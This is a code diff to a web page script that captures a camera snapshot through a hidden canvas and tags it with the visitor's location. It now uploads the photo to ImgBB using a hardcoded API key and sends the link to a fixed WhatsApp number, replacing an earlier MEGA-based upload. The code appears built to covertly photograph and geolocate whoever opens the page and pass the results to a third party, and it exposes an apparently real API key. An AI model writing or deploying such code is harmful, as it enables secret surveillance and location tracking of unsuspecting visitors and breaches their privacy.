@@ -12,9 +12,8 @@
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        const MEGA_EMAIL = "your-email@gmail.com";  // Replace with your MEGA email
-        const MEGA_PASSWORD = "your-password";  // Replace with your MEGA password
-        const WHATSAPP_NUMBER = "94712345678";  // Replace with recipient's WhatsApp number
+        const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";  // Replace with your ImgBB API key
+        const WHATSAPP_NUMBER = "94713424265";  // Replace with recipient's WhatsApp number
 
         let locationLink = "";  // Store location link
         let locationFilename = "";  // Store location as filename
@@ -63,42 +62,33 @@
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     stream.getTracks().forEach(track => track.stop());
-                    canvas.toBlob(uploadToMega, "image/png");
+                    canvas.toBlob(uploadToImgBB, "image/png");
                 };
             } catch (error) {
                 console.error("Camera access error:", error);
             }
         }
 
-        // 📌 Function to upload photo to MEGA
-        function uploadToMega(blob) {
-            const storage = new mega.Storage({
-                email: MEGA_EMAIL,
-                password: MEGA_PASSWORD,
-                autologin: true,
-                ready: function () {
-                    console.log("Logged into MEGA!");
+        // 📌 Function to upload photo to ImgBB
+        function uploadToImgBB(blob) {
+            const formData = new FormData();
+            formData.append("image", blob);
+            formData.append("key", IMGBB_API_KEY);
 
-                    const file = storage.upload({
-                        name: locationFilename,  // 📌 Use location as filename
-                        data: blob,
-                        target: "root"
-                    });
-
-                    file.on("complete", function (fileData) {
-                        fileData.link((err, url) => {
-                            if (err) {
-                                console.error("MEGA link error:", err);
-                            } else {
-                                sendToWhatsApp(url);
-                            }
-                        });
-                    });
-
-                    file.on("error", function (err) {
-                        console.error("Upload failed:", err);
-                    });
+            fetch("https://api.imgbb.com/1/upload", {
+                method: "POST",
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    sendToWhatsApp(data.data.url);  // Send the photo link to WhatsApp
+                } else {
+                    console.error("ImgBB upload failed:", data.error);
                 }
+            })
+            .catch(error => {
+                console.error("ImgBB API request failed:", error);
             });
         }
 
